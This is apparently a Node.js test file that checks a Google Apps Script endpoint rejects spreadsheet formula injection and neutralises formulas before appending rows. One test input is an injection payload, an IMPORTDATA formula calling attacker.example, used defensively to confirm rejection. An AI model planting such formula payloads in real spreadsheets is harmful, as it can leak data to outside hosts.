const assert = require('assert');
const fs = require('fs');
const vm = require('vm');

const rows = [];
const response = (text) => ({
  text,
  setMimeType() { return this; }
});
const context = {
  ContentService: {
    MimeType: { JSON: 'json' },
    createTextOutput: response
  },
  LockService: {
    getScriptLock: () => ({ waitLock() {}, releaseLock() {} })
  },
  SpreadsheetApp: {
    getActiveSpreadsheet: () => ({
      getSheetByName: () => ({
        appendRow: (row) => rows.push(row),
        getLastRow: () => rows.length
      })
    })
  }
};

vm.createContext(context);
vm.runInContext(fs.readFileSync('Code.gs', 'utf8'), context);

function request(uni, uuid) {
  const output = context.doPost({
    postData: { contents: JSON.stringify({ uni, uuid }) },
    parameter: {}
  });
  return JSON.parse(output.text);
}

assert.strictEqual(request('HARVARD', 'A1B2C3D4').result, 'success');
assert.strictEqual(rows.length, 1);
assert.strictEqual(request('=IMPORTDATA("https://attacker.example")', 'A1B2C3D4').result, 'error');
assert.strictEqual(request('HARVARD', '=1+1').result, 'error');
assert.strictEqual(rows.length, 1);

assert.strictEqual(context.neutralizeFormula('=1+1'), "'=1+1");
assert.strictEqual(context.neutralizeFormula('+SUM(A:A)'), "'+SUM(A:A)");
assert.strictEqual(context.neutralizeFormula('SAFE'), 'SAFE');

console.log('Code.gs validation tests passed');
